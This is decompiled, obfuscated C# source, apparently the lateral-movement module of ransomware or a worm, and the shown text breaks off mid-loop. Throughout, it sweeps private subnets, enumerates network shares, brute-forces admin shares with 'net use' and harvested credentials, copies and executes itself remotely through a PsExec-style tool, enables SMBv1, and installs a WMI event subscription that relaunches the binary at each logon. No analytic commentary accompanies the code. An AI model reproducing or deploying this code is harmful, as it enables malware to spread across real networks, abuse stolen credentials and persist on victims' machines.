using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace dfbDZtGQEYGzK;

internal class ULIHMIqJVuh
{
	public class mPMkfqmnBjfel
	{
		public string AWlPRlKmfQot { get; set; }
	}

	public enum FAQQdYJAfnjqw
	{
		riytCfrFfQxBrHr = 1,
		eOHJIIRSPPC,
		bZGkUEYCWcoaE,
		yzulwDGsVErJ,
		mgtfFioapevRS
	}

	public enum BpqzcmaaNTzuFl
	{
		qzfpLQcTtGTLXlL,
		NisXqHoVjUZWI,
		bLGFiaIpGqai,
		sbgUXcPtulngpMO
	}

	public enum FCLFciAEkMh
	{
		jguQCWFYFh = 1,
		HRLLzpBkntCWdVO = 2,
		ljXkWkYiPPNb = 4,
		xMKZgzRAPBXY = 8,
		fNDForVzcQi = 16,
		MgQnwIMaPTBHLy = 19
	}

	public enum vqyjgkFlbaFegw
	{
		tEbGmzwbyRHiAl,
		HEZRbCezATnagf,
		vUBjSyaKHUlNq,
		SSPtNNmzGnyXecvL,
		PJtmIlIAqhHk,
		qNRbabMruWImOcZ,
		gFlPnfjcQRvRYfiX,
		eLYncIBnvkbn,
		nfVqzrGQsDsvQrxSS,
		VEEJZSqahaHnsb,
		EJDXEhtxeDcMo,
		DfoKwNdRWWH
	}

	public class lBfgiIbaUpCP : IEnumerable
	{
		private enum GJuzWsVuQHbYjGvJ
		{
			mLbUGWDOaUZo = 0,
			bGTSTubIDm = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private class smWypVBgXdE
		{
			public FAQQdYJAfnjqw ktwgCAsZaBq;

			public BpqzcmaaNTzuFl WDNuPftDqbNI;

			public vqyjgkFlbaFegw GEWpvINrpHXiUln;

			public FCLFciAEkMh vKmeKCugiZcg;

			public string CzKDnHusXXi;

			public string laTPspmEbnZC;

			public string IWzLSOvPUjMmNJz;

			public string qxKSGAIlqZCtX;
		}

		private ArrayList oSjzWMWrDsX = new ArrayList();

		public int TbyEHOHfvrpa => oSjzWMWrDsX.Count;

		[DllImport("Mpr.dll")]
		private static extern GJuzWsVuQHbYjGvJ WNetOpenEnumA(FAQQdYJAfnjqw dwScope, BpqzcmaaNTzuFl dwType, FCLFciAEkMh dwUsage, smWypVBgXdE p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern GJuzWsVuQHbYjGvJ WNetCloseEnum(IntPtr hEnum);

		[DllImport("Mpr.dll")]
		private static extern GJuzWsVuQHbYjGvJ WNetEnumResourceA(IntPtr hEnum, ref uint lpcCount, IntPtr buffer, ref uint lpBufferSize);

		private void EnumerateServers(smWypVBgXdE pRsrc, FAQQdYJAfnjqw scope, BpqzcmaaNTzuFl type, FCLFciAEkMh usage, vqyjgkFlbaFegw displayType)
		{
			uint lpBufferSize = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint lpcCount = 1u;
			if (WNetOpenEnumA(scope, type, usage, pRsrc, out lphEnum) == GJuzWsVuQHbYjGvJ.mLbUGWDOaUZo)
			{
				GJuzWsVuQHbYjGvJ gJuzWsVuQHbYjGvJ;
				do
				{
					gJuzWsVuQHbYjGvJ = WNetEnumResourceA(lphEnum, ref lpcCount, intPtr, ref lpBufferSize);
					switch (gJuzWsVuQHbYjGvJ)
					{
					case GJuzWsVuQHbYjGvJ.bGTSTubIDm:
						continue;
					case GJuzWsVuQHbYjGvJ.mLbUGWDOaUZo:
						Marshal.PtrToStructure(intPtr, pRsrc);
						if (pRsrc.GEWpvINrpHXiUln == displayType)
						{
							oSjzWMWrDsX.Add(pRsrc.laTPspmEbnZC);
						}
						if ((pRsrc.vKmeKCugiZcg & FCLFciAEkMh.HRLLzpBkntCWdVO) == FCLFciAEkMh.HRLLzpBkntCWdVO)
						{
							EnumerateServers(pRsrc, scope, type, usage, displayType);
						}
						continue;
					}
					break;
				}
				while (gJuzWsVuQHbYjGvJ != GJuzWsVuQHbYjGvJ.bGTSTubIDm);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public lBfgiIbaUpCP(FAQQdYJAfnjqw scope, BpqzcmaaNTzuFl type, FCLFciAEkMh usage, vqyjgkFlbaFegw displayType)
		{
			smWypVBgXdE pRsrc = new smWypVBgXdE();
			EnumerateServers(pRsrc, scope, type, usage, displayType);
		}

		public IEnumerator GetEnumerator()
		{
			return oSjzWMWrDsX.GetEnumerator();
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct zMFnyEqYhhxZNHg
	{
		[MarshalAs(UnmanagedType.LPWStr)]
		public string CsQobaYSYNbbZfv;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string eMVuRsNVlwQjhv;

		public uint BsbotqtzANfGU;

		public uint zWuagTOUxqQQMxe;

		public IntPtr AwxjOHsBoIzIcV;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct hqmWSttNcbpF
	{
		public int BsbotqtzANfGU;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string xRoiNAiWZb;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string dcbDzUabadP;
	}

	public struct tWDEvWWvkEKBd
	{
		public string BduEmElZJsT;

		public string[] VtOabAAGEacy;

		public tWDEvWWvkEKBd(string Name, string[] Target)
		{
			BduEmElZJsT = Name;
			VtOabAAGEacy = Target;
		}
	}

	[CompilerGenerated]
	private sealed class KgvxCyGgofo
	{
		private sealed class IvOzNsNMATiTQuE
		{
			public KgvxCyGgofo QATXgeIkNlarW;

			public int dlFJTFPKWAQB;

			public void _003Cscanner_003Eb__4(int g)
			{
				sWSXzQkxHH.bhxKBVXCniiAP(sWSXzQkxHH.agZtqMkMayfivgE("bmV0LmV4ZQ=="), string.Concat("use \\\\", QATXgeIkNlarW.MaqzZYLNerWQtF, "\\", (char)g, "$ /USER:", fbsFqkSfOX[dlFJTFPKWAQB], " ", eLXEIsiRrqw[dlFJTFPKWAQB]));
				Thread.Sleep(sWSXzQkxHH.PRCzDJqMXxgFe);
				sWSXzQkxHH.IOviBUgqoNt(string.Concat("\\\\", QATXgeIkNlarW.MaqzZYLNerWQtF, "\\", (char)g, "$"));
			}
		}

		public Ping jvbJtdxsayA;

		public PingReply wOzJBcZJbRCE;

		public IPAddress MaqzZYLNerWQtF;

		public string RfHePWazavlfoU;

		public void _003Cscanner_003Eb__2(int i)
		{
			try
			{
				string text = "." + i;
				jvbJtdxsayA = new Ping();
				wOzJBcZJbRCE = jvbJtdxsayA.Send(RfHePWazavlfoU + text, 900);
				if (wOzJBcZJbRCE.Status != 0)
				{
					return;
				}
				try
				{
					MaqzZYLNerWQtF = IPAddress.Parse(RfHePWazavlfoU + text);
					IPHostEntry hostEntry = Dns.GetHostEntry(MaqzZYLNerWQtF);
					if (sWSXzQkxHH.ykYiTFCYjtGh.Contains(string.Concat("\\\\", MaqzZYLNerWQtF, "\\Users")) || hostEntry.HostName.Contains(Environment.MachineName))
					{
						return;
					}
					sWSXzQkxHH.VimSUcVQeamd.Add(MaqzZYLNerWQtF.ToString());
					try
					{
						if (sWSXzQkxHH.zVuzYLSYgUmyh == "YES")
						{
							Parallel.For(0, fbsFqkSfOX.Count, delegate(int f)
							{
								sWSXzQkxHH.bhxKBVXCniiAP(sWSXzQkxHH.agZtqMkMayfivgE("bmV0LmV4ZQ=="), string.Concat("use \\\\", MaqzZYLNerWQtF, "\\Users /USER:", fbsFqkSfOX[f], " ", eLXEIsiRrqw[f]));
								Thread.Sleep(sWSXzQkxHH.PRCzDJqMXxgFe);
								sWSXzQkxHH.IOviBUgqoNt(string.Concat("\\\\", MaqzZYLNerWQtF, "\\Users"));
								Parallel.For(65, 91, delegate(int g)
								{
									sWSXzQkxHH.bhxKBVXCniiAP(sWSXzQkxHH.agZtqMkMayfivgE("bmV0LmV4ZQ=="), string.Concat("use \\\\", MaqzZYLNerWQtF, "\\", (char)g, "$ /USER:", fbsFqkSfOX[f], " ", eLXEIsiRrqw[f]));
									Thread.Sleep(sWSXzQkxHH.PRCzDJqMXxgFe);
									sWSXzQkxHH.IOviBUgqoNt(string.Concat("\\\\", MaqzZYLNerWQtF, "\\", (char)g, "$"));
								});
							});
						}
						else
						{
							sWSXzQkxHH.bhxKBVXCniiAP(sWSXzQkxHH.agZtqMkMayfivgE("bmV0LmV4ZQ=="), string.Concat("use \\\\", MaqzZYLNerWQtF, "\\Users"));
							Thread.Sleep(sWSXzQkxHH.PRCzDJqMXxgFe);
							sWSXzQkxHH.IOviBUgqoNt(string.Concat("\\\\", MaqzZYLNerWQtF, "\\Users"));
							Parallel.For(65, 91, delegate(int g)
							{
								sWSXzQkxHH.bhxKBVXCniiAP(sWSXzQkxHH.agZtqMkMayfivgE("bmV0LmV4ZQ=="), string.Concat("use \\\\", MaqzZYLNerWQtF, "\\", (char)g, "$"));
								Thread.Sleep(sWSXzQkxHH.PRCzDJqMXxgFe);
								sWSXzQkxHH.IOviBUgqoNt(string.Concat("\\\\", MaqzZYLNerWQtF, "\\", (char)g, "$"));
							});
						}
					}
					catch
					{
					}
				}
				catch
				{
				}
			}
			catch (Exception)
			{
			}
		}

		public void _003Cscanner_003Eb__3(int f)
		{
			sWSXzQkxHH.bhxKBVXCniiAP(sWSXzQkxHH.agZtqMkMayfivgE("bmV0LmV4ZQ=="), string.Concat("use \\\\", MaqzZYLNerWQtF, "\\Users /USER:", fbsFqkSfOX[f], " ", eLXEIsiRrqw[f]));
			Thread.Sleep(sWSXzQkxHH.PRCzDJqMXxgFe);
			sWSXzQkxHH.IOviBUgqoNt(string.Concat("\\\\", MaqzZYLNerWQtF, "\\Users"));
			Parallel.For(65, 91, delegate(int g)
			{
				sWSXzQkxHH.bhxKBVXCniiAP(sWSXzQkxHH.agZtqMkMayfivgE("bmV0LmV4ZQ=="), string.Concat("use \\\\", MaqzZYLNerWQtF, "\\", (char)g, "$ /USER:", fbsFqkSfOX[f], " ", eLXEIsiRrqw[f]));
				Thread.Sleep(sWSXzQkxHH.PRCzDJqMXxgFe);
				sWSXzQkxHH.IOviBUgqoNt(string.Concat("\\\\", MaqzZYLNerWQtF, "\\", (char)g, "$"));
			});
		}

		public void _003Cscanner_003Eb__5(int g)
		{
			sWSXzQkxHH.bhxKBVXCniiAP(sWSXzQkxHH.agZtqMkMayfivgE("bmV0LmV4ZQ=="), string.Concat("use \\\\", MaqzZYLNerWQtF, "\\", (char)g, "$"));
			Thread.Sleep(sWSXzQkxHH.PRCzDJqMXxgFe);
			sWSXzQkxHH.IOviBUgqoNt(string.Concat("\\\\", MaqzZYLNerWQtF, "\\", (char)g, "$"));
		}
	}

	[CompilerGenerated]
	private sealed class KsZOqPCarDGTGiWm
	{
		public string gYgDUYPsaASOBBW;

		public string JhbEnfJqtLoMYdD;

		public void _003CRun_003Eb__d(string ip)
		{
			if ((!ip.StartsWith("10.") && !ip.StartsWith("172.") && !ip.StartsWith("192.168.") && !ip.Contains("")) || !SwFwRiZSJvGME(ip))
			{
				return;
			}
			if (sWSXzQkxHH.zVuzYLSYgUmyh == "YES")
			{
				for (int i = 0; i < fbsFqkSfOX.Count; i++)
				{
					if (sWSXzQkxHH.XAoZigRKkvAz)
					{
						if (File.Exists(gYgDUYPsaASOBBW))
						{
							sWSXzQkxHH.bhxKBVXCniiAP(gYgDUYPsaASOBBW, "\\\\" + ip + " -u \"" + fbsFqkSfOX[i] + "\" -p \"" + eLXEIsiRrqw[i] + "\" -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
						}
					}
					else if (File.Exists(JhbEnfJqtLoMYdD))
					{
						sWSXzQkxHH.bhxKBVXCniiAP(JhbEnfJqtLoMYdD, "\\\\" + ip + " -u \"" + fbsFqkSfOX[i] + "\" -p \"" + eLXEIsiRrqw[i] + "\" -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
					}
				}
			}
			else if (sWSXzQkxHH.XAoZigRKkvAz)
			{
				if (File.Exists(gYgDUYPsaASOBBW))
				{
					sWSXzQkxHH.bhxKBVXCniiAP(gYgDUYPsaASOBBW, "\\\\" + ip + " -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
				}
			}
			else if (File.Exists(JhbEnfJqtLoMYdD))
			{
				sWSXzQkxHH.bhxKBVXCniiAP(JhbEnfJqtLoMYdD, "\\\\" + ip + " -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
			}
		}
	}

	[CompilerGenerated]
	private sealed class nzoynUJQlDQY
	{
		public string KjFJUboUuAzL;

		public bool _003CGetIPAddresses_003Eb__11(string o)
		{
			return o != KjFJUboUuAzL;
		}
	}

	private const int jflAltWmLVCfb = 268435455;

	private const int WhXOIKHVVKxFjm = 0;

	public static List<string> vSHnmZbJfdZTco = new List<string>();

	public static string cBUqoawAZQW = "";

	public static List<string> fbsFqkSfOX = new List<string>();

	public static List<string> eLXEIsiRrqw = new List<string>();

	public static List<string> ANYLUaWdnyN = new List<string>();

	public List<string> TATXtkWYFolQ = new List<string>();

	public List<string> KEVsYJnuhlbxg = new List<string>();

	public List<string> JzStWQwEWwW = new List<string>();

	public static void voTQfOXtcLK()
	{
		ULIHMIqJVuh uLIHMIqJVuh = TlusjVDEuUeWZEU();
		Parallel.ForEach(uLIHMIqJVuh.JzStWQwEWwW, delegate(string UoAfnWWZUYjLyOY)
		{
			string text = UoAfnWWZUYjLyOY.Split(new char[1] { '.' })[0] + "." + UoAfnWWZUYjLyOY.Split(new char[1] { '.' })[1] + "." + UoAfnWWZUYjLyOY.Split(new char[1] { '.' })[2];
			if (text.StartsWith("10.") || text.StartsWith("172.") || text.StartsWith("192.168.") || text.StartsWith(""))
			{
				XPBYZyLFCfjRqGr(text);
			}
		});
	}

	public static void XPBYZyLFCfjRqGr(string bBQPuhyftggDEFy)
	{
		Ping jvbJtdxsayA;
		PingReply wOzJBcZJbRCE;
		IPAddress MaqzZYLNerWQtF;
		Parallel.For(0, 255, delegate(int i)
		{
			try
			{
				string text = "." + i;
				jvbJtdxsayA = new Ping();
				wOzJBcZJbRCE = jvbJtdxsayA.Send(bBQPuhyftggDEFy + text, 900);
				if (wOzJBcZJbRCE.Status == IPStatus.Success)
				{
					try
					{
						MaqzZYLNerWQtF = IPAddress.Parse(bBQPuhyftggDEFy + text);
						IPHostEntry hostEntry = Dns.GetHostEntry(MaqzZYLNerWQtF);
						if (!sWSXzQkxHH.ykYiTFCYjtGh.Contains(string.Concat("\\\\", MaqzZYLNerWQtF, "\\Users")) && !hostEntry.HostName.Contains(Environment.MachineName))
						{
							sWSXzQkxHH.VimSUcVQeamd.Add(MaqzZYLNerWQtF.ToString());
							try
							{
								if (sWSXzQkxHH.zVuzYLSYgUmyh == "YES")
								{
									Parallel.For(0, fbsFqkSfOX.Count, delegate(int f)
									{
										sWSXzQkxHH.bhxKBVXCniiAP(sWSXzQkxHH.agZtqMkMayfivgE("bmV0LmV4ZQ=="), string.Concat("use \\\\", MaqzZYLNerWQtF, "\\Users /USER:", fbsFqkSfOX[f], " ", eLXEIsiRrqw[f]));
										Thread.Sleep(sWSXzQkxHH.PRCzDJqMXxgFe);
										sWSXzQkxHH.IOviBUgqoNt(string.Concat("\\\\", MaqzZYLNerWQtF, "\\Users"));
										Parallel.For(65, 91, delegate(int g)
										{
											sWSXzQkxHH.bhxKBVXCniiAP(sWSXzQkxHH.agZtqMkMayfivgE("bmV0LmV4ZQ=="), string.Concat("use \\\\", MaqzZYLNerWQtF, "\\", (char)g, "$ /USER:", fbsFqkSfOX[f], " ", eLXEIsiRrqw[f]));
											Thread.Sleep(sWSXzQkxHH.PRCzDJqMXxgFe);
											sWSXzQkxHH.IOviBUgqoNt(string.Concat("\\\\", MaqzZYLNerWQtF, "\\", (char)g, "$"));
										});
									});
								}
								else
								{
									sWSXzQkxHH.bhxKBVXCniiAP(sWSXzQkxHH.agZtqMkMayfivgE("bmV0LmV4ZQ=="), string.Concat("use \\\\", MaqzZYLNerWQtF, "\\Users"));
									Thread.Sleep(sWSXzQkxHH.PRCzDJqMXxgFe);
									sWSXzQkxHH.IOviBUgqoNt(string.Concat("\\\\", MaqzZYLNerWQtF, "\\Users"));
									Parallel.For(65, 91, delegate(int g)
									{
										sWSXzQkxHH.bhxKBVXCniiAP(sWSXzQkxHH.agZtqMkMayfivgE("bmV0LmV4ZQ=="), string.Concat("use \\\\", MaqzZYLNerWQtF, "\\", (char)g, "$"));
										Thread.Sleep(sWSXzQkxHH.PRCzDJqMXxgFe);
										sWSXzQkxHH.IOviBUgqoNt(string.Concat("\\\\", MaqzZYLNerWQtF, "\\", (char)g, "$"));
									});
								}
								return;
							}
							catch
							{
								return;
							}
						}
						return;
					}
					catch
					{
						return;
					}
				}
			}
			catch (Exception)
			{
			}
		});
	}

	public static ULIHMIqJVuh TlusjVDEuUeWZEU()
	{
		new List<List<string>>();
		new List<string>();
		new List<string>();
		new List<string>();
		ULIHMIqJVuh uLIHMIqJVuh = new ULIHMIqJVuh();
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		NetworkInterface[] array = allNetworkInterfaces;
		foreach (NetworkInterface networkInterface in array)
		{
			if (networkInterface.OperationalStatus != OperationalStatus.Up)
			{
				continue;
			}
			try
			{
				networkInterface.GetIPProperties();
				foreach (UnicastIPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
				{
					if (unicastAddress.Address.AddressFamily != AddressFamily.InterNetwork)
					{
						continue;
					}
					IPAddress address = unicastAddress.Address;
					IPAddress iPv4Mask = unicastAddress.IPv4Mask;
					byte[] addressBytes = address.GetAddressBytes();
					byte[] addressBytes2 = iPv4Mask.GetAddressBytes();
					if (addressBytes.Length == addressBytes2.Length)
					{
						byte[] array2 = new byte[addressBytes.Length];
						for (int j = 0; j < array2.Length; j++)
						{
							array2[j] = (byte)(addressBytes[j] | (addressBytes2[j] ^ 0xFFu));
						}
						IPAddress iPAddress = new IPAddress(array2);
						byte[] array3 = new byte[addressBytes.Length];
						for (int k = 0; k < array3.Length; k++)
						{
							array3[k] = (byte)(addressBytes[k] & addressBytes2[k]);
						}
						IPAddress iPAddress2 = new IPAddress(array3);
						uLIHMIqJVuh.KEVsYJnuhlbxg.Add(networkInterface.Name);
						uLIHMIqJVuh.JzStWQwEWwW.Add(iPAddress2.ToString());
						uLIHMIqJVuh.TATXtkWYFolQ.Add(iPAddress.ToString());
					}
				}
			}
			catch (Exception)
			{
			}
		}
		return uLIHMIqJVuh;
	}

	public static List<mPMkfqmnBjfel> vDxuhxAblvBkHzR()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = "/c net view";
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			List<mPMkfqmnBjfel> list = new List<mPMkfqmnBjfel>();
			while (true)
			{
				if (!process.StandardOutput.EndOfStream)
				{
					string text = process.StandardOutput.ReadLine();
					if (text == "There are no entries in the list.")
					{
						break;
					}
					if (text != string.Empty && text[0] == '\\' && text[1] == '\\')
					{
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 2; i < text.Length && text[i] != ' '; i++)
						{
							stringBuilder.Append(text[i]);
						}
						list.Add(new mPMkfqmnBjfel
						{
							AWlPRlKmfQot = string.Concat("\\", stringBuilder, "\\Users")
						});
					}
					continue;
				}
				process.WaitForExit();
				process.Close();
				return list;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("Netapi32.dll", CharSet = CharSet.Auto)]
	public static extern int NetDfsEnum([MarshalAs(UnmanagedType.LPWStr)] string qGCzRzFLMLUpstl, int GAWiIOzXlMomPgB, int MFjaaYzfeLNb, out IntPtr BRBnSmLevAO, [MarshalAs(UnmanagedType.I4)] out int cstIuPsRjNhp, [MarshalAs(UnmanagedType.I4)] ref int JEDdVGdWwLsWE);

	public static List<tWDEvWWvkEKBd> ATGWitjQmW(string bgkEwqqxmAyNNSE)
	{
		try
		{
			List<tWDEvWWvkEKBd> list = new List<tWDEvWWvkEKBd>();
			IntPtr BRBnSmLevAO = default(IntPtr);
			int cstIuPsRjNhp = 0;
			int JEDdVGdWwLsWE = 0;
			if (NetDfsEnum(bgkEwqqxmAyNNSE, 3, 268435455, out BRBnSmLevAO, out cstIuPsRjNhp, ref JEDdVGdWwLsWE) == 0)
			{
				for (int i = 0; i < cstIuPsRjNhp; i++)
				{
					zMFnyEqYhhxZNHg zMFnyEqYhhxZNHg = (zMFnyEqYhhxZNHg)Marshal.PtrToStructure(BRBnSmLevAO + i * Marshal.SizeOf(typeof(zMFnyEqYhhxZNHg)), typeof(zMFnyEqYhhxZNHg));
					if (zMFnyEqYhhxZNHg.CsQobaYSYNbbZfv == bgkEwqqxmAyNNSE)
					{
						continue;
					}
					List<string> list2 = new List<string>();
					for (int j = 0; j < zMFnyEqYhhxZNHg.zWuagTOUxqQQMxe; j++)
					{
						IntPtr ptr = new IntPtr(zMFnyEqYhhxZNHg.AwxjOHsBoIzIcV.ToInt64() + j * Marshal.SizeOf(typeof(hqmWSttNcbpF)));
						hqmWSttNcbpF hqmWSttNcbpF = (hqmWSttNcbpF)Marshal.PtrToStructure(ptr, typeof(hqmWSttNcbpF));
						if (hqmWSttNcbpF.BsbotqtzANfGU == 2)
						{
							list2.Add(Path.Combine(new string[3] { "\\\\", hqmWSttNcbpF.xRoiNAiWZb, hqmWSttNcbpF.dcbDzUabadP }));
						}
					}
					string text = zMFnyEqYhhxZNHg.CsQobaYSYNbbZfv.Replace(bgkEwqqxmAyNNSE, "");
					if (text.StartsWith("\\"))
					{
						text = text.Substring(1);
					}
					list.Add(new tWDEvWWvkEKBd(text, list2.ToArray()));
				}
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void qOZdNgveXVGlrj()
	{
		sWSXzQkxHH.CHjkcYzdJSQ("Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol");
		List<mPMkfqmnBjfel> list = vDxuhxAblvBkHzR();
		List<tWDEvWWvkEKBd> list2 = ATGWitjQmW(Environment.MachineName);
		if (list2 != null)
		{
			foreach (tWDEvWWvkEKBd item in list2)
			{
				string[] vtOabAAGEacy = item.VtOabAAGEacy;
				foreach (string text in vtOabAAGEacy)
				{
					if (text.Contains(Environment.MachineName) || !string.IsNullOrEmpty(text))
					{
						continue;
					}
					try
					{
						if (sWSXzQkxHH.zVuzYLSYgUmyh == "YES")
						{
							for (int j = 0; j < fbsFqkSfOX.Count; j++)
							{
								sWSXzQkxHH.bhxKBVXCniiAP(sWSXzQkxHH.agZtqMkMayfivgE("bmV0LmV4ZQ=="), "use " + text + " /USER:" + fbsFqkSfOX[j] + " " + eLXEIsiRrqw[j]);
								Thread.Sleep(sWSXzQkxHH.PRCzDJqMXxgFe);
								sWSXzQkxHH.IOviBUgqoNt(text);
							}
						}
						else
						{
							sWSXzQkxHH.bhxKBVXCniiAP(sWSXzQkxHH.agZtqMkMayfivgE("bmV0LmV4ZQ=="), "use " + text);
							Thread.Sleep(sWSXzQkxHH.PRCzDJqMXxgFe);
							sWSXzQkxHH.IOviBUgqoNt(text);
						}
					}
					catch
					{
					}
				}
			}
		}
		if (list == null)
		{
			return;
		}
		foreach (mPMkfqmnBjfel item2 in list)
		{
			if (item2.AWlPRlKmfQot.Contains(Environment.MachineName))
			{
				continue;
			}
			try
			{
				if (sWSXzQkxHH.zVuzYLSYgUmyh == "YES")
				{
					for (int k = 0; k < fbsFqkSfOX.Count; k++)
					{
						sWSXzQkxHH.bhxKBVXCniiAP(sWSXzQkxHH.agZtqMkMayfivgE("bmV0LmV4ZQ=="), "use " + item2.AWlPRlKmfQot + " /USER:" + fbsFqkSfOX[k] + " " + eLXEIsiRrqw[k]);
						Thread.Sleep(sWSXzQkxHH.PRCzDJqMXxgFe);
						sWSXzQkxHH.IOviBUgqoNt(item2.AWlPRlKmfQot);
					}
				}
				else
				{
					sWSXzQkxHH.bhxKBVXCniiAP(sWSXzQkxHH.agZtqMkMayfivgE("bmV0LmV4ZQ=="), "use " + item2.AWlPRlKmfQot);
					Thread.Sleep(sWSXzQkxHH.PRCzDJqMXxgFe);
					sWSXzQkxHH.IOviBUgqoNt(item2.AWlPRlKmfQot);
				}
			}
			catch
			{
			}
		}
	}

	public static void jvRwhwRDgXdTw(string BpMUiyrBTDtJrWm, string NHkfbrMOXd, string guaagowYCnZh)
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Expected O, but got Unknown
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0098: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_0159: Unknown result type (might be due to invalid IL or missing references)
		//IL_0164: Expected O, but got Unknown
		//IL_015f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = "\\\\" + BpMUiyrBTDtJrWm + "\\root\\subscription";
			ConnectionOptions val = new ConnectionOptions();
			ManagementScope val2 = null;
			val2 = new ManagementScope(text, val);
			val2.get_Options().set_Username(NHkfbrMOXd);
			val2.get_Options().set_Password(guaagowYCnZh);
			val2.get_Options().set_Authority(string.Format("ntlmdomain:{0}", "."));
			val2.get_Options().set_EnablePrivileges(true);
			val2.get_Options().set_Authentication((AuthenticationLevel)6);
			val2.get_Options().set_Impersonation((ImpersonationLevel)3);
			val2.Connect();
			ManagementClass val3 = new ManagementClass(val2, new ManagementPath("__EventFilter"), (ObjectGetOptions)null);
			string text2 = "SELECT * FROM __InstanceCreationEvent Within 5 Where TargetInstance Isa 'Win32_LogonSession'";
			WqlEventQuery val4 = new WqlEventQuery(text2);
			ManagementObject val5 = val3.CreateInstance();
			((ManagementBaseObject)val5).set_Item("Name", (object)"WorkerFilter");
			((ManagementBaseObject)val5).set_Item("Query", (object)((ManagementQuery)val4).get_QueryString());
			((ManagementBaseObject)val5).set_Item("QueryLanguage", (object)((ManagementQuery)val4).get_QueryLanguage());
			((ManagementBaseObject)val5).set_Item("EventNameSpace", (object)"root\\cimv2");
			val5.Put();
			ManagementObject val6 = new ManagementClass(val2, new ManagementPath("CommandLineEventConsumer"), (ObjectGetOptions)null).CreateInstance();
			((ManagementBaseObject)val6).set_Item("Name", (object)"EventConsumer");
			((ManagementBaseObject)val6).set_Item("ExecutablePath", (object)("\\\\" + BpMUiyrBTDtJrWm + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)));
			val6.Put();
			ManagementObject val7 = new ManagementClass(val2, new ManagementPath("__FilterToConsumerBinding"), (ObjectGetOptions)null).CreateInstance();
			((ManagementBaseObject)val7).set_Item("Filter", (object)val5.get_Path().get_RelativePath());
			((ManagementBaseObject)val7).set_Item("Consumer", (object)val6.get_Path().get_RelativePath());
			val7.Put();
		}
		catch (Exception)
		{
		}
	}

	public static void JxUftoGDnZPe()
	{
		sWSXzQkxHH.oZLuSlWBWyPTCv();
		List<vlYGhyibgRfG> list = vlYGhyibgRfG.YqQCzkEkPjyUx();
		foreach (vlYGhyibgRfG item in list)
		{
			vSHnmZbJfdZTco.Add(item.SqWGuRtuOIYayEl);
		}
		if (sWSXzQkxHH.VimSUcVQeamd.Count > 0)
		{
			vSHnmZbJfdZTco = vSHnmZbJfdZTco.Union(sWSXzQkxHH.VimSUcVQeamd).ToList();
		}
		string gYgDUYPsaASOBBW = "";
		string JhbEnfJqtLoMYdD = "";
		try
		{
			gYgDUYPsaASOBBW = ScclTwURARDfE();
		}
		catch
		{
		}
		try
		{
			JhbEnfJqtLoMYdD = qYNozZMQbMv();
		}
		catch
		{
		}
		foreach (vlYGhyibgRfG item2 in list)
		{
			try
			{
				if (item2.SqWGuRtuOIYayEl.StartsWith("10.") || item2.SqWGuRtuOIYayEl.StartsWith("172.") || item2.SqWGuRtuOIYayEl.StartsWith("192.168.") || item2.SqWGuRtuOIYayEl.Contains(""))
				{
					TwSubFeqdyvmM.wcYWJQOWNvEgIOz(item2.TMcGYBBxfdTb, item2.SqWGuRtuOIYayEl, "255.255.255.0");
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(vSHnmZbJfdZTco, delegate(string ip)
			{
				if ((ip.StartsWith("10.") || ip.StartsWith("172.") || ip.StartsWith("192.168.") || ip.Contains("")) && SwFwRiZSJvGME(ip))
				{
					if (sWSXzQkxHH.zVuzYLSYgUmyh == "YES")
					{
						for (int i = 0; i < fbsFqkSfOX.Count; i++)
						{
							if (sWSXzQkxHH.XAoZigRKkvAz)
							{
								if (File.Exists(gYgDUYPsaASOBBW))
								{
									sWSXzQkxHH.bhxKBVXCniiAP(gYgDUYPsaASOBBW, "\\\\" + ip + " -u \"" + fbsFqkSfOX[i] + "\" -p \"" + eLXEIsiRrqw[i] + "\" -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
								}
							}
							else if (File.Exists(JhbEnfJqtLoMYdD))
							{
